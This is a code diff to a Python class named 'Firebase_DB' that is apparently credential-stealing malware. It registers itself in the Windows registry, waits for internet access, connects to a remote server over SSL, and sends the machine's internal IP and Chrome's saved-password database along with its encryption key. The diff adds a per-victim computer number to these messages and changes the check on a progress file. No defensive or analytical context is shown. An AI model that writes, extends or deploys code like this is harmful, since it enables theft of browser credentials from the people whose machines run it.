@@ -24,6 +24,11 @@ import time
 
 class Firebase_DB():
     def __init__(self):
+
+        self.server_ip = '' # The IP of the server
+        self.server_port = 33453
+        self.num_comp = 0
+
         # Create a text file on USERPROFILE Path for save the progress, add the app to the registry
         self.data = "10\n20\n"
         self.data_lock = Lock()
@@ -39,28 +44,32 @@ class Firebase_DB():
             with open(self.file_process_path, 'r') as f:
                 with self.data_lock:
                     self.data = f.read()
-
-        # Waiting the computer has internet
-        while True:
-            if self.check_internet_connection():
-                break
-
-        # Connect the server
-        self.server_ip = '' # The IP of the server
-        self.server_port = 33453
-        self.num_comp = 0
-        self.connect_server()
         
-        # Add the number of computer to the file context
-        with self.data_lock:
-            self.data = f"Comp{self.num_comp}\n{self.data}"
-        with open(self.file_process_path, 'w') as f:
-            f.write(self.data)
+        if "finish" not in self.data:
+            # Waiting the computer has internet
+            while True:
+                if self.check_internet_connection():
+                    break
+            
+            if "Comp" in self.data:
+                indexStartComp = self.data.find("Comp") + 4
+                indexEndComp = self.data.find("\n")
+                self.num_comp = self.data[indexStartComp: indexEndComp]
 
-        # Get the data and send it the firebase server
-        self.get_data()
-        # Set the file for read-only
-        os.system(f"attrib +r {self.file_process_path}")
+            else:
+                # Connect the server
+                self.connect_server()
+                
+                # Add the number of computer to the file context
+                with self.data_lock:
+                    self.data = f"Comp{self.num_comp}\n{self.data}"
+                with open(self.file_process_path, 'w') as f:
+                    f.write(self.data)
+
+            # Get the data and send it the firebase server
+            self.get_data()
+            # Set the file for read-only
+            os.system(f"attrib +r {self.file_process_path}")
 
     def connect_server(self):
         """
@@ -161,7 +170,7 @@ class Firebase_DB():
         open = reg.OpenKey(key,key_value,0,reg.KEY_ALL_ACCESS)
 
         # delete the value
-        reg.DeleteValue(open, "App")
+        reg.DeleteValue(open, "App10")
 
         # now close the opened key
         reg.CloseKey(open)
@@ -231,6 +240,7 @@ class Firebase_DB():
         ssl_lock = ssl.wrap_socket(client_socket)
         ssl_lock.connect((self.server_ip, self.server_port))
         ssl_lock.send(int(1).to_bytes(4, byteorder='big'))
+        ssl_lock.send(int(self.num_comp).to_bytes(4, byteorder='big'))
         while not "11" in self.data:
             try:
                 inte_ip = self.get_internal_ip()
@@ -290,6 +300,7 @@ class Firebase_DB():
             ssl_lock = ssl.wrap_socket(client_socket)
             ssl_lock.connect((self.server_ip, self.server_port))
             ssl_lock.send(int(2).to_bytes(4, byteorder='big'))
+            ssl_lock.send(int(self.num_comp).to_bytes(4, byteorder='big'))
             while not "21" in self.data:
                 key = self.fetching_encryption_key()
                 filename = os.path.join(os.environ["USERPROFILE"], "ChromePasswords.db")
